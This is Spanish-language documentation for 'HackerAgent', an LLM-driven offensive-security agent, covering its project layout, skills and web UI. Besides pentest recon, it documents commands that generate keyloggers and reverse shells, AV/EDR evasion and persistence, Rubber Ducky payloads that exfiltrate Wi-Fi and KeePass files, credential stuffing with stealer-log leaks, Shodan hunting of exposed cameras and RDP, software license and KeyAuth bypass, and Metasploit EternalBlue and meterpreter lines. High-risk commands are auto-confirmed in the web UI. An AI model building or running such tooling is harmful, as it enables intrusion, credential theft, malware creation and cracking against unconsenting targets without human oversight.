# HackerAgent — Documentación técnica

## Estructura del proyecto

```text
HackerAgent/
├── agent.py                        # Agente principal de pentesting (CLI)
├── web_server.py                   # Servidor Flask para la Web UI (--web)
├── page/
│   └── index.html                  # SPA: Web UI dinámica estilo Claude (violet theme, SSE)
├── confs.json                      # Rutas y comandos de herramientas externas
├── .env                            # API keys y OLLAMA_URL
├── requirements.txt                # Dependencias Python (requests)
├── skills/
│   ├── __init__.py                 # Loader dinámico + run_skill() + skills_context()
│   ├── pentest_skils/
│   │   ├── crtsh_enum.py           # Certificate Transparency (crt.sh)
│   │   ├── cred_stuff.py           # Auditor de creds: lee expuestas, entiende login (HTML/JSON), veredicto bueno/malo
│   │   ├── gobuster_dir.py         # Gobuster con manejo wildcard 403
│   │   ├── google_dorks.py         # Google dorks de seguridad
│   │   ├── vuln_classifier.py      # Clasificador TP/FP de hallazgos usando LLM local
│   │   ├── metasploit.py           # Metasploit: search/exploit/auxiliary/payload/scan
│   │   ├── nuclei_scan.py          # Nuclei con auto-detección de templates
│   │   ├── scan_red.py             # Nmap con clasificación de puertos críticos
│   │   ├── shodan_query.py         # Shodan v2: host lookup + hunt por device_type/query; CVE→MSF
│   │   ├── exploit_db.py           # Busca exploits en Exploit-DB (searchsploit + web); sugiere MSF
│   │   ├── spider_code.py          # Spider HTML/JS buscando secretos + source maps
│   │   ├── sqli_scan.py            # SQLi: sqlmap (detecta + extrae) + fallback manual
│   │   ├── subfinder_enum.py       # Subfinder + httpx verificación HTTP
│   │   ├── web_attack.py           # Pentest web dinámico: SQLi/XSS/LFI/redirect/cmdi
│   │   ├── web_code.py             # Análisis profundo de código fuente web (JS/CSS/Firebase)
│   │   ├── whiteintel.py           # Descarga credenciales filtradas (stealer logs) vía POST
│   │   ├── whiteintel_num.py       # API WhiteIntel.io v1 (Bearer token, GET+POST, por dominio/empresa)
│   │   └── wpscan_run.py           # WPScan con API key automática
│   ├── inginversa_skills/
│   │   └── agent_ing.py            # Skill RE + agente interactivo standalone
│   ├── movil_skills/
│   │   ├── apk_analyze.py          # RE estático de APK: manifest, secretos, lógica, SSL pinning
│   │   └── apk_dynamic.py          # Frida: bypass SSL pinning + hooks de credenciales/cripto
│   ├── active_directory/
│   │   └── ad_audit.py             # AD Scanner: LDAP/SMB signing, null session, Kerberos, GC
│   ├── dev_skills/
│   │   ├── model_advisor.py        # Recomienda modelo Ollama + prepara toolchain del lenguaje
│   │   ├── code_dev.py             # Desarrolla código (pentest/malware) → out/<proj>/dev/ (pipenv+linters)
│   │   ├── tech_detect.py          # Detecta stack tecnológico (Firebase, DBs, frameworks, auth, cloud, APIs)
│   │   ├── evasion_dev.py          # Metodología AV/EDR evasión: AMSI/ETW/syscalls/injection/persistencia
│   │   └── ducky_dev.py            # Payloads Hak5: Rubber Ducky v1/v3, Bash Bunny, O.MG, WiFi Pineapple, Shark Jack
│   └── osint_skills/
│       ├── theharvester.py         # theHarvester: emails, subs, hosts, empleados desde 15+ fuentes
│       ├── sherlock_osint.py       # Username OSINT en 400+ plataformas (Sherlock/Maigret + fallback Python)
│       ├── email_osint.py          # Email OSINT: Holehe, H8mail, HIBP, EmailRep, MX, Gravatar, Hunter.io
│       ├── breach_search.py        # Breaches: HIBP, DeHashed, LeakCheck, IntelX, Snusbase, Phonebook.cz
│       ├── dns_full.py             # DNS completo: AXFR, SPF/DMARC/DKIM, brute-force, DNSRecon/Fierce/Amass
│       ├── metadata_osint.py       # ExifTool + Metagoofil: usuarios, software, paths internos en documentos
│       ├── phone_osint.py          # OSINT de teléfono: PhoneInfoga, NumVerify, CNAM, carrier, VoIP detection
│       ├── wayback_osint.py        # Wayback Machine CDX API: URLs históricas, secretos JS, robots.txt diff
│       ├── recon_ng_osint.py       # Recon-ng automatizado + fallback (WHOIS, DNS brute, HackerTarget, GitHub)
│       └── social_osint.py         # Social OSINT: Reddit API, Twitter/X, LinkedIn, GitHub secretos, Pastebin
│   └── redteam_skills/             # Integración metodología RedTeam Barranquilla (redteambq.co)
│       ├── ptes_methodology.py     # Plan PTES 7-fases mapeado a skills (discover, don't assume)
│       ├── report_pro.py           # Reporte Ejecutivo + Técnico (PTES/OWASP) desde project_state.json
│       ├── ike_enum.py             # IKE/IPSec Aggressive Mode: ike-scan + psk-crack (crackeo PSK)
│       └── sudo_privesc.py         # Escalada por sudo: matcher de CVEs (Baron Samedit, chwoot, runas -1…)
├── .claude/agents/                 # Subagentes Claude Code: redteam-agent.md, report-agent.md
├── out/                            # out/<nombre_proyecto>/  (creado por picker)
│   └── <proyecto>/
│       └── credentials/            # whiteintel_num guarda aquí JSONs + creds.txt
└── out_re/                         # out_re/<binname>/  (ing_inversa standalone)
```

---

## Configuración

### .env

```ini
OLLAMA_URL=http://192.168.80.120:11434/api/chat
WPSCAN_API_KEY=...
SHODAN_API_KEY=...
VIRUSTOTAL_API_KEY=...
WHITEINTEL_API_KEY=...
BROWSER=firefox

# OSINT APIs (opcionales — los skills funcionan sin ellas con fallbacks)
HIBP_API_KEY=...            # haveibeenpwned.com — breaches por email
LEAKCHECK_API_KEY=...       # leakcheck.io — credenciales filtradas
DEHASHED_USER=...           # dehashed.com — email+key para búsquedas
DEHASHED_API_KEY=...
INTELX_API_KEY=...          # intelx.io — inteligencia profunda
SNUSBASE_API_KEY=...        # snusbase.com — base de datos de breaches
BREACHDIRECTORY_API_KEY=... # breachdirectory.org
NUMVERIFY_API_KEY=...       # apilayer.net — validación de teléfonos
ABSTRACT_API_KEY=...        # abstractapi.com — alternativa phone
TWILIO_ACCOUNT_SID=...      # CNAM lookup (caller name)
TWILIO_AUTH_TOKEN=...
HUNTER_API_KEY=...          # hunter.io — emails por dominio
GITHUB_TOKEN=...            # github.com — rate limit elevado en búsquedas
TWITTER_BEARER_TOKEN=...    # Twitter API v2
OTX_API_KEY=...             # AlienVault OTX — passive DNS
```

Modelos recomendados: `deepseek-r1:14b` (equilibrado) · `deepseek-r1:32b` (máxima calidad) · `dolphin-mistral:latest` (rápido)

---

## Sistema de Skills

### Loader (`skills/__init__.py`)

Carga módulos desde dos niveles usando `importlib.util.spec_from_file_location`:
1. `skills/*.py` — raíz
2. `skills/<subdir>/*.py` — subdirectorios (donde viven todos los skills actuales)

No requiere tocar `__init__.py` al agregar un skill nuevo.

### Categorías

```python
CATEGORY_LABELS = {
    "recon_pasivo": "🔍 RECONOCIMIENTO PASIVO",           # crtsh, google_dorks, shodan, subfinder, whiteintel, whiteintel_num
    "recon_activo": "⚡ RECONOCIMIENTO ACTIVO",            # gobuster, scan_red
    "osint":        "🕵  OSINT / INTELIGENCIA",            # theharvester, sherlock, email_osint, breach_search, dns_full, metadata_osint, phone_osint, wayback_osint, recon_ng_osint, social_osint
    "vuln_scan":    "🎯 ESCANEO DE VULNERABILIDADES",      # nuclei, wpscan, sqli_scan, web_attack, ad_audit, exploit_db
    "analisis":     "🔬 ANÁLISIS DE CÓDIGO",               # spider_code, web_code
    "ing_inversa":  "🔬 INGENIERÍA INVERSA",               # ing_inversa
    "ataque":       "💥 ATAQUE / EXPLOTACIÓN",             # metasploit, cred_stuff
    "movil":        "📱 PENTESTING MÓVIL / APK",            # apk_analyze, apk_dynamic
    "desarrollo":   "🛠  DESARROLLO DE CÓDIGO / MALWARE",  # model_advisor, code_dev, tech_detect, evasion_dev, ducky_dev
    "metodologia":  "🧭 METODOLOGÍA PTES / REPORTING",      # ptes_methodology, report_pro
    "otros":        "⚙  OTROS",
}
```

### Sintaxis en `commands`

```
SKILL:crtsh_enum domain=example.com
SKILL:google_dorks domain=example.com dork_type=all
SKILL:subfinder_enum domain=example.com verify_http=true
SKILL:shodan_query target=example.com
SKILL:shodan_query device_type=camera country=MX limit=20
SKILL:shodan_query device_type=hikvision country=ES
SKILL:shodan_query query='port:554 has_screenshot:true' limit=15
SKILL:shodan_query device_type=rdp country=US limit=50
SKILL:exploit_db search=hikvision
SKILL:exploit_db cve=CVE-2021-36260
SKILL:exploit_db product=apache version=2.4.49
SKILL:exploit_db edb_id=50512
SKILL:exploit_db search="wordpress plugin" type=webapps limit=20
SKILL:gobuster_dir target=https://example.com extensions=php,html,txt
SKILL:scan_red target=192.168.1.1 ports=top1000
SKILL:nuclei_scan target=https://example.com severity=critical,high
SKILL:wpscan_run target=https://example.com enumerate=vp,vt,u
SKILL:web_attack target=https://example.com tests=sqli,xss,lfi,redirect,cmdi
SKILL:sqli_scan target='https://example.com/item.php?id=1' dump=true
SKILL:sqli_scan target=https://example.com/login data="user=a&pass=b"
SKILL:whiteintel domain=example.com type=stealer scope=corporate limit=500
SKILL:whiteintel_num target=example.com company=ExampleCorp
SKILL:ad_audit target=192.168.1.0/24
SKILL:ad_audit target=corp.local timeout=2 threads=50
SKILL:cred_stuff target=https://example.com/login domain=example.com   # auto-baja creds de whiteintel
SKILL:cred_stuff target=https://example.com/login creds=/tmp/whiteintel_example.com_*/creds.txt
SKILL:cred_stuff target=https://example.com/api/login creds="user:pass;admin:1234"
SKILL:spider_code target=https://example.com
SKILL:web_code target=https://example.com
SKILL:web_code target=https://example.com max_files=50
SKILL:ing_inversa target=/ruta/al/binario
SKILL:model_advisor kind=pentest language=python setup=true
SKILL:code_dev request="reverse shell TCP con reconexión" kind=payload language=python
SKILL:code_dev request="keylogger sigiloso" kind=malware language=c model=dolphin-mistral:latest
SKILL:tech_detect target=https://example.com
SKILL:tech_detect target=https://example.com deep=true
SKILL:tech_detect target=/ruta/al/proyecto
SKILL:evasion_dev list_techniques=true
SKILL:evasion_dev list_techniques=true category=injection
SKILL:evasion_dev technique=amsi_patch language=csharp
SKILL:evasion_dev technique=inject_apc payload="C:\\shell.bin" language=c arch=x64
SKILL:evasion_dev technique=sleep_ekko payload=beacon.bin language=c
SKILL:evasion_dev technique=syscall_direct language=c arch=x64
SKILL:evasion_dev technique=persist_registry payload="C:\\payload.exe" language=powershell
SKILL:evasion_dev technique=persist_linux_cron payload="/tmp/.x" language=bash
SKILL:evasion_dev technique=loader_dotnet payload=Assembly.exe language=csharp
SKILL:evasion_dev technique=obf_aes payload=shellcode.bin language=c
SKILL:ducky_dev list_payloads=true
SKILL:ducky_dev payload=win_reverse_shell lhost=10.10.14.1 lport=4444
SKILL:ducky_dev payload=win_reverse_shell device=rubber_ducky encode=true
SKILL:ducky_dev payload=win_amsi_bypass_shell lhost=10.10.14.1 lport=4444
SKILL:ducky_dev payload=win_wifi_passwords lhost=10.10.14.1 lport=9001
SKILL:ducky_dev payload=win_add_admin_user username=hacker password=P@ssw0rd
SKILL:ducky_dev payload=linux_reverse_shell lhost=10.10.14.1 lport=4444
SKILL:ducky_dev payload=linux_cron_persistence lhost=10.10.14.1 lport=4444
SKILL:ducky_dev payload=mac_reverse_shell lhost=10.10.14.1 lport=4444
SKILL:ducky_dev payload=bb_twin_attack device=bash_bunny lhost=10.10.14.1 lport=4444
SKILL:ducky_dev payload=bb_storage_exfil device=bash_bunny
SKILL:ducky_dev payload=lockpicker_os_detect lhost=10.10.14.1 lport=4444
SKILL:ducky_dev payload=keystroke_logger lhost=10.10.14.1 lport=9001
SKILL:ducky_dev payload=pineapple_captive_portal device=wifi_pineapple
SKILL:ducky_dev payload=sharkjack_recon device=shark_jack lhost=10.10.14.1
SKILL:ducky_dev request="keylogger con exfil por DNS" device=rubber_ducky os=windows lhost=10.10.14.1
SKILL:ducky_dev request="exfiltrar archivos .kdbx de KeePass" device=bash_bunny os=windows
SKILL:ducky_dev request="backdoor SSH en Linux sin sudo" device=omg_cable os=linux
SKILL:vuln_classifier input="SQLi en login.php" source=web_attack
SKILL:vuln_classifier file=/tmp/nuclei_out.json source=nuclei
SKILL:vuln_classifier input="<texto>" format=verbose
SKILL:apk_analyze target=/ruta/app.apk
SKILL:apk_dynamic action=ssl-unpin target=com.ejemplo.app run=true
SKILL:apk_dynamic action=hook target=com.ejemplo.app
SKILL:metasploit mode=search cve=CVE-2017-0144
SKILL:theharvester domain=example.com sources=google,bing,linkedin limit=200
SKILL:sherlock_osint username=johndoe
SKILL:sherlock_osint username=johndoe timeout=15 sites=github,twitter,instagram
SKILL:email_osint email=john@example.com
SKILL:email_osint domain=example.com find_pattern=true
SKILL:breach_search email=john@corp.com
SKILL:breach_search domain=corp.com
SKILL:breach_search username=johndoe
SKILL:dns_full domain=example.com
SKILL:dns_full domain=example.com brute=true threads=50
SKILL:dns_full domain=example.com axfr=true brute=false
SKILL:metadata_osint domain=example.com file_types=pdf,docx,xlsx limit=25
SKILL:phone_osint phone=+521234567890
SKILL:phone_osint phone=+15551234567 country=US
SKILL:wayback_osint domain=example.com
SKILL:wayback_osint domain=example.com check_secrets=true diff_robots=true
SKILL:recon_ng_osint domain=example.com
SKILL:recon_ng_osint company="Acme Corp" domain=acme.com
SKILL:social_osint company="Acme Corp" domain=acme.com
SKILL:social_osint username=johndoe keyword="security"
SKILL:metasploit mode=exploit target=10.10.11.1 module=exploit/windows/smb/ms17_010_eternalblue lhost=10.10.14.1
SKILL:metasploit mode=scan target=192.168.1.0/24
SKILL:metasploit mode=payload lhost=10.10.14.1 payload=windows/x64/meterpreter/reverse_tcp output=/tmp/shell.exe
SKILL:ptes_methodology target=example.com
SKILL:ptes_methodology target=10.10.11.87 phase=exploitation
SKILL:report_pro project=mi_proyecto target=example.com
SKILL:ike_enum target=10.10.11.87 wordlist=/usr/share/wordlists/rockyou.txt
SKILL:sudo_privesc version=1.9.15
SKILL:sudo_privesc          # sin versión → comandos de enumeración
```

### Integración RedTeam Barranquilla (`skills/redteam_skills/`)

Metodología y técnicas adaptadas de la comunidad [RedTeam Barranquilla](https://redteambq.co/)
(PTES, enfoque *discover-don't-assume*). Añade la categoría `metodologia`:

| Skill | Categoría | Qué hace | Severidades |
|-------|-----------|----------|-------------|
| `ptes_methodology` | metodologia | Plan PTES 7-fases mapeado a skills de HackerAgent | info / low |
| `report_pro` | metodologia | Reporte Ejecutivo + Técnico desde `project_state.json` | info (report_generated) |
| `ike_enum` | recon_activo | IKE/IPSec Aggressive Mode (ike-scan + psk-crack) | psk_cracked (critical) · ike_aggressive_mode/psk_hash (high) · ike_identity (medium) |
| `sudo_privesc` | ataque | Matcher de CVEs de sudo + enumeración | sudo_cve (critical/high/medium) · info |

Además, los subagentes de Claude Code en `.claude/agents/` (`redteam-agent`, `report-agent`)
orquestan el flujo PTES y la redacción de reportes apoyándose en estos skills.

### Estructura de cada skill

```python
META = {
    "name":        "nombre_skill",
    "category":    "recon_pasivo",
    "description": "...",
    "args":        ["target", "..."],
    "example":     "SKILL:nombre_skill target=...",
}

def run(**kwargs) -> dict:
    return {
        "success":  bool,
        "output":   str,
        "findings": [
            {"type": "...", "value": "...", "severity": "critical|high|medium|low|info"}
        ],
    }
```

### Severidad de findings

| Skill | critical | high | medium | low | info |
|-------|----------|------|--------|-----|------|
| `vuln_classifier` | tp_confirmed (critical) | tp_confirmed (high) | tp_confirmed (medium) | tp_confirmed (low) | false_positive / inconclusive |
| `nuclei_scan` | CVE crítico | CVE alto | CVE medio | — | tecnologías |
| `wpscan_run` | — | CVEs | plugins/temas | — | versiones |
| `shodan_query` | exploit_available (CVE+exploit) | cve_exposure / risky_port | device_found abierto | — | host info / device |
| `exploit_db` | exploit_found (remote/multiple) | exploit_found (webapp/local) | exploit_found (dos) | — | msf_module / edb_id |
| `gobuster_dir` | — | — | `.env`,`.sql`,`.bak` | admin/login | paths |
| `scan_red` | puertos 23,6379,9200,27017 | 21,445,3306,3389 | puertos medios | — | host info |
| `metasploit` | session_opened / vuln_confirmed | CVE encontrado | smb_share/user | — | módulos encontrados |
| `sqli_scan` | sqli confirmado | database accesible | — | — | técnica/DBMS |
| `web_attack` | sqli / lfi / command_injection | xss reflejado | open_redirect | — | — |
| `whiteintel` | set user:pass filtrado | credencial individual / leaked_credential | — | — | — |
| `whiteintel_num` | leaked_credentials_set | exposed_domain / leaked_credential | compromised_software | — | — |
| `cred_stuff` | valid_credential (login OK) | — | — | — | — |
| `ad_audit` | — | ldap_anonymous_search / smb_signing_disabled / smb_null_session | ldap_signing_not_required / smb_signing_not_required | ldaps_invalid_cert | dc_identified / ad_confirmed / kerberos_active / ldap_global_catalog |
| `code_dev` | — | — | model_warning | — | code_generated |
| `model_advisor` | — | — | model_warning | — | model_recommendation / toolchain |
| `apk_analyze` | apk_secret (creds/keys) | apk_exported / debuggable / JWT | permisos / cleartext / logic | SharedPreferences | URLs / lógica |
| `apk_dynamic` | — | ssl_unpin_active | — | — | mobile_artifact (scripts Frida) |
| `spider_code` | credenciales/firebase/aws | api_keys | endpoints | internal_network | source maps |
| `web_code` | firebase_config / credential / source_map_exposed | firebase_collection / storage_ref | api_endpoint / websocket / env_vars | — | framework / librería / nav_route |
| `ing_inversa` | bypass exitoso / hardcoded_credential | función auth | bypass falló | NX/PIE | tipo binario / file_used |
| `crtsh_enum`, `subfinder_enum`, `google_dorks` | — | — | — | — | dominios/URLs |

### Agregar un nuevo skill

1. Crear `skills/<subdir>/mi_skill.py` con `META` y `run()`
2. Se carga automáticamente — no tocar `agent.py` ni `__init__.py`
3. Aparece en el system prompt del modelo agrupado por categoría

---

## agent.py — Agente principal

### Uso

```bash
python3 agent.py
python3 agent.py --model deepseek-r1:14b
python3 agent.py --session mi_sesion      # carga sesión legacy por nombre (salta picker)
python3 agent.py --list-sessions
python3 agent.py --no-wizard
python3 agent.py --web                    # inicia Web UI en http://127.0.0.1:7860
python3 agent.py --web --port 8080        # puerto personalizado
```

### Flujo de inicio

```
python3 agent.py
    │
    ├─ pick_or_create_project()           # pantalla de proyectos
    │       ├─ Proyecto nuevo → pide nombre → out/<slug>/
    │       └─ Proyecto existente → lista sesiones → reanudar o nueva sesión
    │
    ├─ [si sesión reanudada] load_session_in_project() → conversación restaurada
    │
    └─ [si sesión nueva] ask_session_config() → wizard de configuración
           ├─ Paso 1: tipo de análisis (TASK_PROFILES)
           ├─ Paso 2: target, subdominios, reporte, sigilo, agresividad, use_subagents
           └─ Paso 3: selección de skills por número/categoría/nombre
```

### Picker de proyecto (`pick_or_create_project`)

Lista proyectos en `out/` con: nombre display, target, nº sesiones, resumen de severidad, fecha última sesión.

```
📁  PROYECTOS GUARDADOS
  1.  corp_auditoria_2026    example.com     3 sesiones  2026-07-01
      2 critical  5 high
  2.  ctf_hackthebox         10.10.11.1      7 sesiones  2026-06-30
   0.  [Crear nuevo proyecto]
```

Al elegir un proyecto existente muestra sus sesiones y ofrece reanudar una o iniciar una nueva.

### TASK_PROFILES

| # | Perfil | Categorías | Agresividad |
|---|--------|-----------|-------------|
| 1 | Pentesting web / Red Team | recon_pasivo, recon_activo, vuln_scan | 3 |
| 2 | Ingeniería inversa / Binarios | ing_inversa | 1 |
| 3 | OSINT / Recon pasivo | recon_pasivo | 1 |
| 4 | Escaneo de vulnerabilidades | vuln_scan, recon_activo | 3 |
| 5 | Análisis de código / Secretos | analisis | 2 |
| 6 | Full (todos los skills) | todos | 2 |

### Comandos interactivos

| Comando | Descripción |
|---------|-------------|
| `help` / `ayuda` / `?` | Muestra todo lo que el agente puede hacer (comandos, disparadores y skills por categoría) |
| `salir` / `exit` | Guarda sesión y sale |
| `cd <ruta>` | Cambia directorio de trabajo |
| `sesiones` | Lista sesiones guardadas |
| `sesion guardar <nombre>` | Guarda sesión con nombre |
| `sesion cargar <nombre>` | Carga sesión previa |
| `apikeys` | Muestra estado de API keys |
| `reporte` / `html` | Genera reporte HTML + Markdown |
| `listame vulnerabilidades` / `vulns` | Parsea log y lista vulns numeradas |
| `explotar <N>` | Crea PoC para la vulnerabilidad número N |

### Auto-pentest (`hackea/escanea <url>`)

Regex detecta: `hackea`, `escanea`, `pentest`, `audita`, `analiza`, `ataca`, `testea` + URL/dominio.

`run_pentest_phases()` ejecuta SIN LLM:
- **CRT.SH**: `SKILL:crtsh_enum`
- **Fase 1**: whois, dig, curl headers, Google dorks, Shodan InternetDB
- **Fase 2**: whatweb, wafw00f, robots.txt, sitemap.xml, subfinder
- **Fase 3**: spider secretos en HTML/JS, source maps, email harvest, comentarios

Detecta CMS → pasa a LLM con instrucciones de explotación (Fase 4-5).

### Auto-RE / bypass (`bypass/crackea/reversea/parchea …`)

`_RE_TRIGGER` detecta: `bypass`, `bypassea`, `crackea`, `reversea`, `revierte`, `parchea`,
`patchea`, `desbloquea`, `saltar`, `ingeniería inversa`. `_resolve_re_target()` saca la ruta
del mensaje (o usa el `cwd` si no hay ninguna) y ejecuta `SKILL:ing_inversa target=<ruta>` SIN LLM.

- Si el bypass se completa (existe `binfinal`) → imprime el archivo bypasseado + credenciales y termina el turno.
- Si queda parcial → pasa el análisis al LLM para que continúe con más técnicas (no se detiene).

Ejemplo: `bypass el login` en una carpeta → autodescubre el archivo del login, lo revierte y
devuelve la copia bypasseada + `run_bypass.sh`.

### Clases y funciones clave

| Símbolo | Línea aprox. | Descripción |
|---------|-------------|-------------|
| `CircuitBreaker` | 171 | Detecta sig = primeras 2 palabras, corta tras 3 repeticiones |
| `ScanCache` | 197 | Cache 24h en `scan_cache.json` |
| `SubAgent` | 238 | Agente ligero por tarea: contexto propio, hilo separado, resumen compacto |
| `LogWriter` | ~490 | Escribe `.md` en tiempo real |
| `ProjectState` | ~554 | Persistencia JSON: `domains` (set), `findings` (list), deduplicación |
| `pick_or_create_project()` | ~696 | Pantalla de selección/creación de proyecto |
| `list_project_sessions()` | ~730 | Lista sesiones de un proyecto concreto |
| `load_session_in_project()` | ~745 | Carga sesión desde directorio de proyecto |
| `TASK_PROFILES` | ~1430 | 6 perfiles de tarea |
| `ask_session_config()` | ~1510 | Wizard: acepta `prefill_project_name` |
| `generate_html_report()` | ~1760 | HTML dark theme con gráficos |
| `run_pentest_phases()` | ~1970 | 4 fases de recon sin LLM |
| `print_help()` | ~1385 | Ayuda completa (comandos + disparadores + skills por categoría) |
| `_RE_TRIGGER` / `_resolve_re_target()` | ~2005 | Disparador de RE + resolución del archivo/carpeta objetivo |
| `parse_skill_call()` | — | Detecta `SKILL:nombre k=v` → `(name, args_dict)` |
| `summarize_if_needed()` | — | Comprime conversación >22K chars |

### Arquitectura multi-agente (SubAgent)

Cuando `use_subagents: true` (default), cada skill lanza un `SubAgent` en hilo independiente:

```
Skill ejecutado (inline, rápido)
    │
    ├─ s_out, s_findings → ProjectState.ingest() / log
    │
    └─ SubAgent thread ──► Ollama (contexto propio, 4096 tokens)
                               │  system prompt: analista de seguridad
                               │  input: skill_name + target + output[:6000]
                               └─► {"summary", "key_findings", "next_step"}
                                        │
                                        ▼
                               all_output.append(compacto)
                               (agente principal recibe resumen, NO el raw output)
```

- Si hay 3 skills → 3 SubAgents analizan en paralelo
- Cada SubAgent tiene contexto propio — sin contaminación cruzada
- Si Ollama no responde → `{"summary": "[SubAgent error]"}` sin romper el flujo

**Salida en terminal:**
```
🎯 SKILL: nuclei_scan  {...}
  [output crudo...]
  └─ ✓ OK
🤖 SubAgent[nuclei_scan] lanzado (análisis en paralelo)

⏳ Esperando 1 SubAgent(s)...

┌─ SubAgent [nuclei_scan]
│  3 CVEs activos. Log4Shell confirmado en /api/log.
│  [CRITICAL] CVE-2021-44228 Log4Shell RCE en /api/log
│  [HIGH] CVE-2022-22965 Spring4Shell en /app
└─ ▶ Explotar con SKILL:metasploit mode=exploit
```

### ProjectState — persistencia entre sesiones

```python
project_state = ProjectState(target_dir, project_name=..., target=...)
# Tras cada skill:
new_doms = project_state.ingest_skill_findings(skill_name, s_findings)
project_state.save()  # → out/<proyecto>/project_state.json
```

`ingest_skill_findings()` extrae dominios de `subdomain_crt`, `subdomain`, `http_active`, `dork_url`.
`add_finding()` deduplica por `(type, value[:80])` mirando los últimos 200 findings.

### Ejecución de comandos (cada turno)

```
commands: ["SKILL:nuclei_scan ...", "curl -sI ...", "nmap ..."]
    │
    ├─ skill_cmds    → run_skill() → SubAgent.start() (paralelo)
    │                → ingest_skill_findings() → project_state.save()
    │                → SubAgent.join() → all_output.append(compacto)
    ├─ parallel_cmds (curl, dig, subfinder...) → run_commands_parallel()
    └─ sequential_cmds → run_command() con per-tool timeout
         ├─ wpscan → inyecta --api-token + --random-user-agent
         ├─ nuclei → nuclei_fix_template_paths() + inject_nuclei_json()
         └─ curl/httpx → verify_http_response() (SQLi/XSS/LFI/RCE determinístico)
```

### Salida en disco

```text
out/<nombre_proyecto>/
├── project_state.json                ← dominios, findings, sev_summary (persiste entre sesiones)
├── scan_cache.json                   ← TTL 24h por comando
├── session_YYYYMMDD_HHMMSS.json      ← conversación completa
├── session_YYYYMMDD_HHMMSS.md        ← log en tiempo real
├── session_YYYYMMDD_HHMMSS_report.md
└── session_YYYYMMDD_HHMMSS_report.html  ← dark theme con gráficos
```

### Formato JSON del modelo

```json
{
  "thinking":              "razonamiento interno",
  "commands":              ["SKILL:nuclei_scan target=<url>", "nmap -sV <ip>"],
  "message":               "texto plano en español para el usuario",
  "requires_confirmation": false,
  "task_complete":         false,
  "risk_level":            "low|medium|high|critical",
  "phase":                 "recon|scan|exploit|post-exploit|report",
  "install_needed":        [],
  "needs_api_keys":        [],
  "open_browser":          "",
  "fetch_url":             ""
}
```

---

## Skill: ing_inversa (`skills/inginversa_skills/agent_ing.py`)

Doble función:
1. **Skill** (`META` + `run()`) — invocable con `SKILL:ing_inversa target=/ruta`
2. **Agente standalone** (`main()`) — `python3 agent_ing.py --target /ruta`

`target` puede ser un **binario**, un **script** (bash/python/php/…) o un **directorio**
(autodescubre el objetivo con `_discover_target()`).

**Scripts** (`_script_flow()`): entiende el código fuente, extrae la contraseña embebida
(`_extract_creds()`), detecta qué archivos usa el script y lee sus secretos
(`_find_referenced_files()`), y genera una copia bypasseada neutralizando los condicionales
de auth (`_patch_bash()` / `_patch_generic()`) + `run_bypass.sh`.

**Binarios** — `run()` ejecuta sin LLM:
1. Análisis estático: file, strings, nm, checksec, readelf, compiler, r2_funcs
2. `_skill_detect_type()`: cython / pyinstaller / nuitka / golang / rust / elf_cmp / elf / pe / unknown
3. **`_source_recovery()` (PRIORIDAD)**: si junto al binario hay código fuente Python
   (`modules/`, `.git`, `*.py`), localiza el login (`_PY_AUTH_LINE`), lo parchea
   quirúrgicamente (`_neutralize_login`: flags de auth→True, `.login()`→pass,
   `while not logged_in`→`while False`) y genera `<main>_bypass.py` + `run_bypass.sh`.
   Es la vía más fiable para apps Cython/PyInstaller con KeyAuth. Solo si no hay fuente
   parcheable pasa al bypass a nivel binario (LD_PRELOAD / online / patch r2).
4. `_skill_apply_bypass()`:
   - cython / pyinstaller / elf_cmp / unknown → **LD_PRELOAD** (intercepta memcmp/strcmp)
   - elf/golang/rust con funciones auth → **r2 patch** (`wa ret`)
4. Crea `out_re/<bin>_<ts>/binfinal` + `run_bypass.sh`

### Detección de tipo

| Señal | Tipo | Técnica |
|-------|------|---------|
| `__pyx_*` en nm | cython | LD_PRELOAD |
| `MEIPASS` en strings | pyinstaller | LD_PRELOAD |
| `nuitka` en strings | nuitka | LD_PRELOAD |
| `go build` en strings | golang | r2 patch |
| `rustc` en strings | rust | r2 patch |
| ELF + `memcmp@GLIBC` / `strcmp@GLIBC` | elf_cmp | LD_PRELOAD |
| ELF sin lo anterior | elf | r2 patch si hay funcs auth, si no LD_PRELOAD |

### Mecanismo de auth: LOCAL vs ONLINE (`_detect_auth_mechanism()`)

Antes de aplicar el bypass, el skill distingue si el login es **local** (memcmp/strcmp →
LD_PRELOAD/r2) u **online** (KeyAuth, licencias, API HTTP). Para auth online el LD_PRELOAD
de memcmp **no sirve** (la decisión la toma el servidor). En ese caso `_apply_online_bypass()`
genera artefactos de bypass en runtime y devuelve `success=False` (no verificado):

| Señal en strings/nm | Mecanismo | Artefactos generados |
|---------------------|-----------|----------------------|
| `keyauth` / `keyauth.win` | `online_keyauth` | `frida_bypass.js` + `fake_keyauth.py` (redirige a localhost) + intento patch r2 |
| `requests`/`http`/`license`/`hwid`/`token` (≥2) | `online_generic` | `frida_bypass.js` + intento patch r2 |
| `memcmp@GLIBC` / `strcmp@GLIBC` | `local_cmp` | LD_PRELOAD (verificable) |

El agente reporta los artefactos y **no** afirma éxito hasta que se prueben en runtime.
IMPORTANTE: el LD_PRELOAD solo aplica si se ejecuta `run_bypass.sh`, no `./binfinal` directo.

---

## Web UI (`web_server.py` + `page/index.html`)

Iniciada con `python3 agent.py --web` (o `--port NNNN`). Flask sirve la SPA desde `page/index.html`.

### Arquitectura

```
Flask (web_server.py)
  ├── GET  /                          → page/index.html (SPA)
  ├── GET  /api/projects              → lista proyectos en out/
  ├── POST /api/projects              → crea proyecto
  ├── GET  /api/projects/<id>/sessions
  ├── POST /api/projects/<id>/sessions/<s>/chat  → SSE stream de eventos
  ├── GET  /api/projects/<id>/sessions/<s>/history
  ├── GET  /api/projects/<id>/sessions/<s>/skills
  ├── POST /api/projects/<id>/sessions/<s>/upload
  ├── GET  /api/projects/<id>/state
  ├── GET  /api/models                → modelos Ollama disponibles
  └── POST /api/projects/<id>/report
```

### Eventos SSE del chat

| Tipo | Contenido |
|------|-----------|
| `thinking_start` | inicio del ciclo |
| `thinking` | `{content, phase, risk}` |
| `message` | `{content, phase, risk}` texto final del agente |
| `status` | estado textual durante el ciclo |
| `skill_start` | `{skill, args}` |
| `skill_done` | `{skill, output, success, findings}` |
| `command_start` | `{cmd}` |
| `command_done` | `{cmd, stdout, stderr, code, cached}` |
| `new_findings` | `{findings[]}` findings del skill |
| `nuclei_findings` | `{findings[]}` CVEs de nuclei JSON |
| `vuln_indicators` | `{indicators[]}` SQLi/XSS en respuesta HTTP |
| `fetch_start/done` | URL fetched + preview |
| `confirm_request` | comandos de alto riesgo (auto-confirmado en web) |
| `skipped_cmd` | comando ya ejecutado o circuit-breaker |
| `error` | error de ejecución |
| `done` | fin del turno + nombre de sesión |

